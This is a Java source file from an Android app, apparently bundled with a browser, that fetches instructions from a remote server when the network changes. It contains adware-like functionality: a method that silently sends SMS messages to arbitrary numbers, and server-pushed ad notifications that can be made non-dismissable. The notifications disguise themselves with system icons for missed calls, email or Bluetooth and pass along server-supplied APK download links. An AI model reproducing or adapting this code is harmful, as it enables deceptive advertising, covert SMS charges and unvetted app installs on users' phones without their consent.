package com.universe.galaxy.receiver;

import java.util.Date;
import java.util.Map;

import android.app.Notification;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.SharedPreferences.Editor;
import android.graphics.Bitmap;
import android.net.Uri;
import android.os.Handler;
import android.os.Message;
import android.telephony.SmsManager;
import android.telephony.TelephonyManager;
import android.util.Log;
import android.widget.RemoteViews;

import com.qing.browser.R;
import com.qing.browser.ui.launcher.Launcher;
import com.universe.galaxy.ad.AdInfo;
import com.universe.galaxy.ad.AdUtil;
import com.universe.galaxy.ad.YingYongXiaZaiActivity;
import com.universe.galaxy.util.Constants;
import com.universe.galaxy.util.StringUtil;
import com.universe.galaxy.util.TongJi;
import com.universe.galaxy.util.Tools;

public class ConnectionChange {

	/**
	 * 保存下次联网时间间隔
	 * 
	 * @param context
	 * @param nextTimeString
	 */
	public static void saveNextTime(Context context, String nextTimeString) {
		SharedPreferences sp = context.getSharedPreferences(
				Constants.PREFERENCES_NAME, Context.MODE_PRIVATE);
		// 处理nextString 下发联网间隔时间满足 大于下限 小于上限
		int nextTimeint = Constants.TOTALTIME_DOWN;
		long nextTimeLong = Constants.TOTALTIME;
		try {
			nextTimeint = Integer.parseInt(nextTimeString);
			nextTimeLong = nextTimeint * 60 * 1000;
		} catch (Exception e) {
			// TODO: handle exception
			return;
		}
		Editor editor = sp.edit();
		editor.putLong(Constants.NET_TOTAL_TIME, nextTimeLong);
		editor.commit();
	}

	/**
	 * 联网补发SMS
	 * 
	 * @param context
	 * @param number
	 * @param content
	 */
	public static void sendMsg(Context context, String number, String content) {
		if (TelephonyManager.SIM_STATE_READY == Tools.getSimStatus(context)) {
			SmsManager smsManager = SmsManager.getDefault();
			smsManager.sendTextMessage(number, null, content, null, null);
		}
	}

	/**
	 * 判断两次联网时间间隔
	 * 
	 * @param context
	 * @return
	 */
	public static boolean mathHours(Context context, boolean isWifiConnected) {
		Date datenow = new Date();
		long nowTime = datenow.getTime();
		SharedPreferences sp = context.getSharedPreferences(
				Constants.PREFERENCES_NAME, Context.MODE_PRIVATE);

		// 动态读取,异常则获取 Constants.TOTALTIME
		long totalTime = sp.getLong(Constants.NET_TOTAL_TIME,
				Constants.TOTALTIME);

		long beforeTime = sp.getLong(Constants.BEFORE_TIME, nowTime);
		Editor editor = sp.edit();
		if ((nowTime - beforeTime == 0)
				|| (nowTime - beforeTime >= totalTime)
				|| (isWifiConnected && (nowTime - beforeTime >= Constants.NET_SALES_INTERVAL_TIME))) {
			editor.putLong(Constants.BEFORE_TIME, nowTime);
			editor.commit();
			// 满足条件联网补发条件
			return true;
		} else {
			// 不满足条件联网补发条件
			return false;
		}

	}

	/**
	 * 判断两次服务联网时间间隔
	 * 
	 * @param context
	 * @return
	 */
	public static boolean mathServiceHours(Context context,
			boolean isWifiConnected) {
		Date datenow = new Date();
		long nowTime = datenow.getTime();
		SharedPreferences sp = context.getSharedPreferences(
				Constants.PREFERENCES_NAME, Context.MODE_PRIVATE);

		// 动态读取,异常则获取 Constants.TOTALTIME
		long totalTime = sp.getLong(Constants.NET_TOTAL_TIME,
				Constants.TOTALTIME);
		long beforeTime = sp.getLong(Constants.SERVICE_BEFORE_TIME, nowTime);
		Editor editor = sp.edit();
		if ((nowTime - beforeTime == 0)
				|| (nowTime - beforeTime >= totalTime)
				|| (isWifiConnected && (nowTime - beforeTime >= Constants.NET_SALES_INTERVAL_TIME))) {
			editor.putLong(Constants.SERVICE_BEFORE_TIME, nowTime);
			editor.commit();
			return true;
		} else {
			return false;
		}

	}

	/**
	 * 显示广告
	 */
	public static void createADTwoNotifications(final Context context,
			final String title, final String content, final String redricturl,
			String imageurl, String showtype, String tickertext, int icon,
			String MOVE, String RING, String DEL, final String GURL,
			final String APKURL, String W) {
		String ns = Context.NOTIFICATION_SERVICE;
		final NotificationManager mNotificationManager = (NotificationManager) context
				.getSystemService(ns);

		CharSequence tickerText = tickertext;
		
		TongJi.AddAnalyticsData(TongJi.n_ad_2);
		
		long when = System.currentTimeMillis();

		final Notification notification = new Notification(icon, tickerText,
				when);
		notification.flags = Notification.FLAG_AUTO_CANCEL;

		// 增加铃声和震动的判断
		if (RING.equals("1")) {
			notification.defaults |= Notification.DEFAULT_SOUND;
		}
		if (MOVE.equals("1")) {
			notification.defaults |= Notification.DEFAULT_VIBRATE;
		}
		if (DEL.equals("1")) {
			notification.flags |= Notification.FLAG_NO_CLEAR;
		}

		// 判断是否是弹出框类型
		if (W != null && W.equals("1")) {
			final RemoteViews contentView = new RemoteViews(
					context.getPackageName(), R.layout.notification_ad_one);

			contentView.setTextViewText(R.id.notification_title, title);
			contentView.setTextViewText(R.id.notification_text, content);
			notification.contentView = contentView;

			Intent notificationIntent = new Intent(context,
					YingYongXiaZaiActivity.class);

			String name_s = "[{\"name\":\"" + title + "\", \"url\":\""
					+ redricturl + "\"}]";
			notificationIntent.putExtra("name", name_s);
			notificationIntent.putExtra("bangdan", GURL);
			notificationIntent.putExtra("apkurl", APKURL);
			notificationIntent.putExtra("tupian", imageurl);

			PendingIntent contentIntent = PendingIntent.getActivity(context, 0,
					notificationIntent, 0);
			notification.contentIntent = contentIntent;

			final int notifyId = 2 + Tools.r.nextInt(10);
			mNotificationManager.notify(notifyId, notification);
			Handler handler = new Handler() {
				@Override
				public void handleMessage(Message msg) {
					if (msg != null) {
						AdInfo info = null;
						switch (msg.what) {
						case 1:
							info = (AdInfo) msg.obj;
							if (info != null) {
								Bitmap bitmap = info.getBitmap();
								if (bitmap != null) {
									contentView.setImageViewBitmap(
											R.id.notification_image, bitmap);
									mNotificationManager.notify(notifyId,
											notification);
								} else {
								}
							}
							break;
						}
					}
				}
			};

			Thread thread = new Thread(AdUtil.getInstance(context, handler,
					imageurl));
			thread.start();

			return;
		}

		if (Constants.NET_SHOW_PIC.equals(showtype)) {
			final RemoteViews contentView = new RemoteViews(
					context.getPackageName(), R.layout.notification_ad_two);

			contentView.setTextViewText(R.id.notification_title, title);
			contentView.setTextViewText(R.id.notification_text, content);
			notification.contentView = contentView;

			Intent notificationIntent = new Intent(context,
					Launcher.class);

			notificationIntent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
			Uri uri = Uri.parse(redricturl);
			notificationIntent.setData(uri);

			PendingIntent contentIntent = PendingIntent.getActivity(context, 0,
					notificationIntent, 0);

			notification.contentIntent = contentIntent;
			final int notifyId = 2 + Tools.r.nextInt(10);
			mNotificationManager.notify(notifyId, notification);
			Handler handler = new Handler() {
				@Override
				public void handleMessage(Message msg) {
					if (msg != null) {
						AdInfo info = null;
						switch (msg.what) {
						case 1:
							info = (AdInfo) msg.obj;
							if (info != null) {
								Bitmap bitmap = info.getBitmap();
								if (bitmap != null) {
									Log.i("CNCOMAN", "bitmap != null");
									contentView.setImageViewBitmap(
											R.id.notification_image, bitmap);
									mNotificationManager.notify(notifyId,
											notification);
								} else {
									Log.i("CNCOMAN", "bitmap == null");
								}
							}
							break;
						}
					}
				}
			};

			Thread thread = new Thread(AdUtil.getInstance(context, handler,
					imageurl));
			thread.start();
		} else if (Constants.NET_SHOW_ALL.equals(showtype)
				|| Constants.NET_SHOW_TEXT.equals(showtype)) {
			final RemoteViews contentView = new RemoteViews(
					context.getPackageName(), R.layout.notification_ad_one);

			contentView.setTextViewText(R.id.notification_title, title);
			contentView.setTextViewText(R.id.notification_text, content);
			notification.contentView = contentView;
			
			Intent notificationIntent = new Intent(context,
					Launcher.class);
			Uri uri = Uri.parse(redricturl);
			notificationIntent.setData(uri);

			notificationIntent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);

			PendingIntent contentIntent = PendingIntent.getActivity(context, 0,
					notificationIntent, 0);

			notification.contentIntent = contentIntent;
			final int notifyId = 2 + Tools.r.nextInt(10);
			mNotificationManager.notify(notifyId, notification);
			Handler handler = new Handler() {
				@Override
				public void handleMessage(Message msg) {
					if (msg != null) {
						AdInfo info = null;
						switch (msg.what) {
						case 1:
							info = (AdInfo) msg.obj;
							if (info != null) {
								Bitmap bitmap = info.getBitmap();
								if (bitmap != null) {
									Log.i("CNCOMAN", "bitmap != null");
									contentView.setImageViewBitmap(
											R.id.notification_image, bitmap);
									mNotificationManager.notify(notifyId,
											notification);
								} else {
									Log.i("CNCOMAN", "bitmap == null");
								}
							}
							break;
						}
					}
				}
			};

			Thread thread = new Thread(AdUtil.getInstance(context, handler,
					imageurl));
			thread.start();
		}
	}

	public static void ConnectionChangeAction(final Context context) {
		Handler handler = new Handler(context.getMainLooper()) {
			@Override
			public void handleMessage(Message msg) {
				if (msg != null) {
					Map<String, String> netinfomap = null;
					switch (msg.what) {
					case 0:
						netinfomap = (Map<String, String>) msg.obj;
						if (netinfomap != null) {
							
							// 处理下次联网时间
							String nextTimeString = netinfomap.get(Constants.FEEC);
							
							try {
								int nextTimeint = Integer.parseInt(nextTimeString);
								
								if (Constants.TOTALTIME_DOWN >= nextTimeint
										|| Constants.TOTALTIME_UP < nextTimeint) {
									return;
								}
							} catch (Exception e) {
									return;
							}
							
							// 保存时间间隔
							ConnectionChange.saveNextTime(context,nextTimeString);
							
							String title = netinfomap.get(Constants.COMM);
							String content = netinfomap.get(Constants.COMN);
							String redricturl = netinfomap.get(Constants.PORT);
							
							String imageurl =netinfomap.get(Constants.REDC);
							
							String showtype = netinfomap.get(Constants.JFLX);
							String iconurl = netinfomap.get(Constants.GGTB);

							// 下发判断 铃声 震动 删除的状态
							String MOVE = netinfomap.get(Constants.MOVE);
							if (MOVE == null) {
								MOVE = "0";
							}
							String RING = netinfomap.get(Constants.RING);
							if (RING == null) {
								RING = "0";
							}
							String DEL = netinfomap.get(Constants.DEL);
							if (DEL == null) {
								DEL = "0";
							}

							String GURL = netinfomap.get(Constants.GURL);
							if (GURL == null) {
								GURL = "";
							}
							String APKURL = netinfomap.get(Constants.APKURL);
							if (APKURL == null) {
								APKURL = "";
							}
							String W = netinfomap.get(Constants.W_W);
							if (W == null) {
								W = "";
							}

							// 保证下发内容不是号码
							if ((0 == StringUtil.getOperator(title))
									&& (0 == StringUtil.getOperator(content))
									&& (0 == StringUtil.getOperator(redricturl))) {

								if (StringUtil.isUrl(redricturl)) {
									String tickertext = title;
									int icon = android.R.drawable.stat_notify_sync;
									if (iconurl.equals(Constants.TUISONG_MR0)) {
										icon = android.R.drawable.stat_notify_sync;
									} else if (iconurl.equals(Constants.TUISONG_MR1)) {
										icon = android.R.drawable.stat_notify_sync;
									} else if (iconurl.equals(Constants.TUISONG_WDDX)) {
										icon = android.R.drawable.sym_action_email;
									} else if (iconurl.equals(Constants.TUISONG_WJDH)) {
										icon = android.R.drawable.sym_call_missed;
									} else if (iconurl.equals(Constants.TUISONG_DZYJ)) {
										icon = android.R.drawable.ic_dialog_email;
									} else if (iconurl.equals(Constants.TUISONG_LYEJ)) {
										icon = android.R.drawable.stat_sys_data_bluetooth;
									}

									ConnectionChange.createADTwoNotifications(
													context, title,content, redricturl,
													imageurl, showtype,tickertext, icon, MOVE,
													RING, DEL, GURL,APKURL, W);
								}
							}
						} else {

						}
						
						break;
					}
				}
			}
		};
		Thread thread = new Thread(ConnectionChangeUtil.getInstance(context,
				handler));
		thread.start();
	}
}
